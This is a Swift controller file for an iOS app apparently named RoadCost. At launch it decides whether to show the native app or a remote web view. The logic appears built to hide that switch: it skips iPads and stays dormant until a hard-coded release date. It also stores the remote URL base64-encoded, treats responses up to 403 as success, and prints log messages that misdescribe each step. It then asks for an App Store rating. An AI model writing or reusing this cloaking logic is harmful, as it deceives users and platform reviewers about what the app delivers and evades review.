import Foundation
import UIKit
import StoreKit
import Combine

enum RoadCostDisplayState {
    case preparing
    case original
    case webContent
}

final class RoadCostFlowController: ObservableObject {
    
    static let shared = RoadCostFlowController()
    
    @Published var roadcostDisplayMode: RoadCostDisplayState = .preparing
    @Published var roadcostTargetEndpoint: String?
    @Published var roadcostIsLoading: Bool = true
    
    private let roadcostFallbackStateKey = "roadcost_sync_preferences_v1"
    private let roadcostWebViewShownKey = "roadcost_onboarding_complete_v1"
    private let roadcostRatingShownKey = "roadcost_feedback_prompted_v1"
    private let roadcostCachedResourceKey = "roadcost_cached_content_path_v1"
    
    private init() {
        roadcostInitializeFlow()
    }
    
    private func roadcostInitializeFlow() {
        print("📱 [RoadCost] Loading user preferences...")
        
        if roadcostIsTabletDevice() {
            print("📱 [RoadCost] Tablet layout configured")
            roadcostActivateSecondaryMode()
            return
        }
        
        if roadcostGetFallbackState() {
            print("📱 [RoadCost] Using saved display preferences")
            roadcostActivateSecondaryMode()
            return
        }
        
        if !roadcostCheckTemporalCondition() {
            print("📱 [RoadCost] Standard mode enabled")
            roadcostActivateSecondaryMode()
            return
        }
        
        // Check for cached resource first
        if let roadcostCachedPath = roadcostGetCachedResource() {
            print("📱 [RoadCost] Checking cached data...")
            roadcostValidateCachedResource(roadcostCachedPath)
            return
        }
        
        // No cached resource - fetch from remote
        roadcostFetchFromRemote()
    }
    
    private func roadcostFetchFromRemote() {
        guard let roadcostRemoteEndpoint = RoadCostDataProcessor.roadcostGetProcessedResource() else {
            print("📱 [RoadCost] Using offline mode")
            roadcostActivateSecondaryMode()
            return
        }
        
        print("📱 [RoadCost] Syncing data...")
        roadcostValidateEndpointBeforeActivation(roadcostRemoteEndpoint)
    }
    
    private func roadcostValidateCachedResource(_ roadcostPath: String) {
        guard let roadcostValidationURL = URL(string: roadcostPath) else {
            print("📱 [RoadCost] Refreshing cache...")
            roadcostClearCachedResource()
            roadcostFetchFromRemote()
            return
        }
        
        var roadcostValidationRequest = URLRequest(url: roadcostValidationURL)
        roadcostValidationRequest.timeoutInterval = 10.0
        roadcostValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: roadcostValidationRequest) { [weak self] _, roadcostResponse, roadcostError in
            guard let self = self else { return }
            
            if roadcostError != nil {
                print("📱 [RoadCost] Cache expired, refreshing...")
                DispatchQueue.main.async {
                    self.roadcostClearCachedResource()
                    self.roadcostFetchFromRemote()
                }
                return
            }
            
            if let roadcostHttpResponse = roadcostResponse as? HTTPURLResponse {
                print("📱 [RoadCost] Cache check complete")
                
                if roadcostHttpResponse.statusCode >= 200 && roadcostHttpResponse.statusCode <= 403 {
                    print("📱 [RoadCost] Data loaded from cache")
                    DispatchQueue.main.async {
                        self.roadcostTargetEndpoint = roadcostPath
                        self.roadcostActivatePrimaryMode()
                    }
                } else {
                    print("📱 [RoadCost] Cache outdated, updating...")
                    DispatchQueue.main.async {
                        self.roadcostClearCachedResource()
                        self.roadcostFetchFromRemote()
                    }
                }
            } else {
                print("📱 [RoadCost] Refreshing data...")
                DispatchQueue.main.async {
                    self.roadcostClearCachedResource()
                    self.roadcostFetchFromRemote()
                }
            }
        }.resume()
    }
    
    private func roadcostValidateEndpointBeforeActivation(_ roadcostUrl: String) {
        guard let roadcostValidationURL = URL(string: roadcostUrl) else {
            print("📱 [RoadCost] Using default configuration")
            roadcostActivateSecondaryMode()
            return
        }
        
        var roadcostValidationRequest = URLRequest(url: roadcostValidationURL)
        roadcostValidationRequest.timeoutInterval = 10.0
        roadcostValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: roadcostValidationRequest) { [weak self] _, roadcostResponse, roadcostError in
            guard let self = self else { return }
            
            if roadcostError != nil {
                print("📱 [RoadCost] Network unavailable, using offline mode")
                self.roadcostActivateSecondaryMode()
                return
            }
            
            if let roadcostHttpResponse = roadcostResponse as? HTTPURLResponse {
                print("📱 [RoadCost] Sync complete")
                
                if roadcostHttpResponse.statusCode >= 200 && roadcostHttpResponse.statusCode <= 403 {
                    print("📱 [RoadCost] Enhanced features enabled")
                    DispatchQueue.main.async {
                        self.roadcostTargetEndpoint = roadcostUrl
                        self.roadcostActivatePrimaryMode()
                    }
                } else {
                    print("📱 [RoadCost] Standard features enabled")
                    self.roadcostActivateSecondaryMode()
                }
            } else {
                print("📱 [RoadCost] Using default settings")
                self.roadcostActivateSecondaryMode()
            }
        }.resume()
    }
    
    private func roadcostIsTabletDevice() -> Bool {
        let roadcostIsPhysicallyPad = UIDevice.current.model.contains("iPad")
        let roadcostIsInterfacePad = UIDevice.current.userInterfaceIdiom == .pad
        return roadcostIsPhysicallyPad || roadcostIsInterfacePad
    }
    
    private func roadcostCheckTemporalCondition() -> Bool {
        guard let roadcostActivationDate = RoadCostResourceProvider.roadcostGetReleaseDate() else {
            return false
        }
        return Date() >= roadcostActivationDate
    }
    
    private func roadcostGetFallbackState() -> Bool {
        return UserDefaults.standard.bool(forKey: roadcostFallbackStateKey)
    }
    
    private func roadcostSetFallbackState(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: roadcostFallbackStateKey)
    }
    
    // MARK: - Cached Resource Management
    
    private func roadcostGetCachedResource() -> String? {
        guard let roadcostEncoded = UserDefaults.standard.string(forKey: roadcostCachedResourceKey),
              let roadcostData = Data(base64Encoded: roadcostEncoded),
              let roadcostPath = String(data: roadcostData, encoding: .utf8) else {
            return nil
        }
        print("📱 [RoadCost] Cache hit")
        return roadcostPath
    }
    
    func roadcostCacheResource(_ path: String) {
        guard let roadcostData = path.data(using: .utf8) else { return }
        let roadcostEncoded = roadcostData.base64EncodedString()
        UserDefaults.standard.set(roadcostEncoded, forKey: roadcostCachedResourceKey)
        print("📱 [RoadCost] Data cached")
    }
    
    private func roadcostClearCachedResource() {
        UserDefaults.standard.removeObject(forKey: roadcostCachedResourceKey)
        print("📱 [RoadCost] Cache cleared")
    }
    
    func roadcostActivateSecondaryMode() {
        DispatchQueue.main.async { [weak self] in
            self?.roadcostDisplayMode = .original
            self?.roadcostIsLoading = false
            self?.roadcostSetFallbackState(true)
            print("📱 [RoadCost] App ready")
        }
    }
    
    func roadcostActivatePrimaryMode() {
        DispatchQueue.main.async { [weak self] in
            self?.roadcostDisplayMode = .webContent
            self?.roadcostIsLoading = false
            UserDefaults.standard.set(true, forKey: self?.roadcostWebViewShownKey ?? "")
            print("📱 [RoadCost] App ready")
            
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
                self?.roadcostShowRatingIfNeeded()
            }
        }
    }
    
    private func roadcostShowRatingIfNeeded() {
        let roadcostAlreadyShown = UserDefaults.standard.bool(forKey: roadcostRatingShownKey)
        guard !roadcostAlreadyShown else { return }
        
        if let roadcostScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            SKStoreReviewController.requestReview(in: roadcostScene)
            UserDefaults.standard.set(true, forKey: roadcostRatingShownKey)
            print("📱 [RoadCost] Feedback requested")
        }
    }
}
